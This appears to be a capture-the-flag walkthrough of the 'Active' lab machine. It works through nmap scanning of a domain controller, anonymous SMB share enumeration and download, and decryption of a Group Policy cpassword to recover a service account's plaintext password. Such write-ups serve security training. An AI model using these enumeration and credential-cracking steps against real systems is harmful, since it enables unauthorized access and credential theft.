# Active

## Table Of Contents:
<!--ts-->
  * [Port & Service Enumeration](#port-&-service-enumeration)
    * [LDAP](#LDAP)
    * [SMB](#SMB)
<!--te-->

# **Port & Service Enumeration**

## Nmap Scans

### Generic Nmap Scan

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-7fh072w4l6]─[~]
└──╼ [★]$ nmap -sC -sV -vv 10.129.38.174
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 20:14 CST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Initiating Ping Scan at 20:14
Scanning 10.129.38.174 [4 ports]
Completed Ping Scan at 20:14, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:14
Completed Parallel DNS resolution of 1 host. at 20:14, 0.00s elapsed
Initiating SYN Stealth Scan at 20:14
Scanning 10.129.38.174 [1000 ports]
Discovered open port 139/tcp on 10.129.38.174
Discovered open port 135/tcp on 10.129.38.174
Discovered open port 53/tcp on 10.129.38.174
Discovered open port 445/tcp on 10.129.38.174
Discovered open port 636/tcp on 10.129.38.174
Discovered open port 49157/tcp on 10.129.38.174
Discovered open port 49155/tcp on 10.129.38.174
Discovered open port 88/tcp on 10.129.38.174
Discovered open port 49158/tcp on 10.129.38.174
Discovered open port 3268/tcp on 10.129.38.174
Discovered open port 49153/tcp on 10.129.38.174
Discovered open port 464/tcp on 10.129.38.174
Discovered open port 389/tcp on 10.129.38.174
Discovered open port 49154/tcp on 10.129.38.174
Discovered open port 49152/tcp on 10.129.38.174
Discovered open port 3269/tcp on 10.129.38.174
Discovered open port 593/tcp on 10.129.38.174
Completed SYN Stealth Scan at 20:14, 1.24s elapsed (1000 total ports)
Initiating Service scan at 20:14
Scanning 17 services on 10.129.38.174
Completed Service scan at 20:15, 59.72s elapsed (17 services on 1 host)
NSE: Script scanning 10.129.38.174.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 8.49s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.26s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Nmap scan report for 10.129.38.174
Host is up, received echo-reply ttl 127 (0.0090s latency).
Scanned at 2025-01-01 20:14:27 CST for 69s
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-02 02:14:35Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-02T02:15:31
|_  start_date: 2025-01-02T02:12:28
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42989/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 39928/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 3654/udp): CLEAN (Timeout)
|   Check 4 (port 45616/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.10 seconds
           Raw packets sent: 1034 (45.472KB) | Rcvd: 1002 (40.180KB)
```

From the open ports this appears to be an Active Directory Challenge...

## **LDAP**

## **SMB**

### Share Enumeration: Anonymous Bind

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-7fh072w4l6]─[~]
└──╼ [★]$ smbmap -H 10.129.38.174
[+] IP: 10.129.38.174:445	Name: 10.129.38.174                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

Let's also try this recursively!

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-7fh072w4l6]─[~]
└──╼ [★]$ smbmap -H 10.129.38.174 -R
[+] IP: 10.129.38.174:445	Name: 10.129.38.174                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
	.\Replication\active.htb\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
	.\Replication\active.htb\DfsrPrivate\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Installing
	.\Replication\active.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              119 Sat Jul 21 05:38:11 2018	GPE.INI
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               22 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Windows NT
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```

Yay! We can anonymously read the *Replication* Share!

### **Download All Files to Attacker Machine**

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~]
└──╼ [★]$ smbclient -U '%' -N \\\\10.129.38.174\\Replication
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

		5217023 blocks of size 4096. 278375 blocks available
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

After looking through the extracted files we find a username *SVC_TGS* and an encrypted password in the *groups.xml* file!

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="<REDACTED>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Doing a simple Google search on *cpassword* we find that it is a known mal-practice of storing passwords in GPOs.

Additionally, we can use this tools to crack the password
[LINK](https://github.com/t0thkr1s/gpp-decrypt)

### **Cracking the *cpassword* **

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop/gpp-decrypt]
└──╼ [★]$ python gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Password: GPPstillStandingStrong2k18
```
